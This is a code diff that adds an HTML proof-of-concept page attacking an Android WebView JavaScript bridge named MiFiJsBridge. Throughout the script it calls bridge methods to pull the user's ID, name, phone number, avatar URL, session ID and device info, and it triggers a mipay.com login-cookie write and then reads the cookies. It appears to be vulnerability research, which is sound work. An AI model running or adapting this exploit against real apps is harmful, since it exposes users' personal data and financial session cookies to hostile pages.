@@ -1,17 +1,99 @@
-<!DOCTYPE html>
-<html lang="zh">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial chartset=UTF-8">
-    <title>Webview 测试页面</title>
-    <style>
-        body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
-        h1 { color: green; }
-    </style>
-</head>
-<body>
-   <script>
-    document.write(MiFiJsBridge.invoke('Data','getDeviceInfo','',''))
-   </script>
-</body>
-</html>
+<!doctype html>
+  <html lang="zh-CN">
+  <head>
+      <meta charset="utf-8">
+      <title>Bridge PoC</title>
+  </head>
+  <body>
+      <h3>MiFiJsBridge PoC</h3>
+      <pre id="log"></pre>
+
+      <script>
+          function log(tag, data) {
+              var node = document.getElementById("log");
+              var line = "[" + tag + "] " + (typeof data === "object" ? JSON.stringify(data, null, 2) : data);
+              node.textContent += line + "\n";
+              console.log(line);
+          }
+
+          // ========== 1. 定义全局回调函数（异步数据从这里回来） ==========
+
+          // getUserInfo 回调
+          window.onUserInfo = function(value) {
+              log("getUserInfo_CALLBACK", value);
+              // 如果value是字符串，尝试解析
+              try {
+                  var parsed = typeof value === "string" ? JSON.parse(value) : value;
+                  log("userId", parsed.userId);
+                  log("userName", parsed.userName);
+                  log("safePhone", parsed.safePhone);
+                  log("avatarUrl", parsed.avatarUrl);
+              } catch(e) {
+                  log("parse_error", e.message);
+              }
+          };
+
+          // getSessionId 回调
+          window.onSessionId = function(value) {
+              log("getSessionId_CALLBACK", value);
+          };
+
+          // getDeviceInfo 回调
+          window.onDeviceInfo = function(value) {
+              log("getDeviceInfo_CALLBACK", value);
+          };
+
+          // loginService 回调
+          window.onLoginService = function(value) {
+              log("loginService_CALLBACK", value);
+              // 登录Cookie写入后读取当前域Cookie
+              log("cookie_after_login", document.cookie);
+          };
+
+          // ========== 2. 发起调用 ==========
+
+          function run() {
+              if (!window.MiFiJsBridge) {
+                  log("ERROR", "MiFiJsBridge not found");
+                  return;
+              }
+              log("bridge", "found");
+
+              // --- 同步返回的只是 code=0（已受理），不含业务数据 ---
+
+              // 检查登录态
+              var hasLogin = MiFiJsBridge.invoke("Account", "hasLogin", null, null);
+              log("hasLogin_SYNC", hasLogin);
+
+              // 读取用户信息（异步 -> window.onUserInfo）
+              var r1 = MiFiJsBridge.invoke("Account", "getUserInfo", null, "window.onUserInfo");
+              log("getUserInfo_SYNC", r1);  // 这里只会显示 code=0
+
+              // 读取会话标识（异步 -> window.onSessionId）
+              var r2 = MiFiJsBridge.invoke("Data", "getSessionId", null, "window.onSessionId");
+              log("getSessionId_SYNC", r2);
+
+              // 读取设备信息（异步 -> window.onDeviceInfo）
+              var r3 = MiFiJsBridge.invoke("Data", "getDeviceInfo", null, "window.onDeviceInfo");
+              log("getDeviceInfo_SYNC", r3);
+
+              // 触发金融sid登录Cookie写入（异步 -> window.onLoginService）
+              var loginParam = JSON.stringify({
+                  sid: "mipaycom",
+                  cookieUrl: "https://m.mipay.com/",
+                  webloginUrl: ""
+              });
+              var r4 = MiFiJsBridge.invoke("Account", "loginService", loginParam, "window.onLoginService");
+              log("loginService_SYNC", r4);
+
+              // 延迟读取Cookie（等待异步Cookie写入完成）
+              setTimeout(function() {
+                  log("cookie@5s", document.cookie);
+              }, 5000);
+          }
+
+          // 等待桥注入完成后再执行
+          setTimeout(run, 1500);
+      </script>
+  </body>
+  </html>
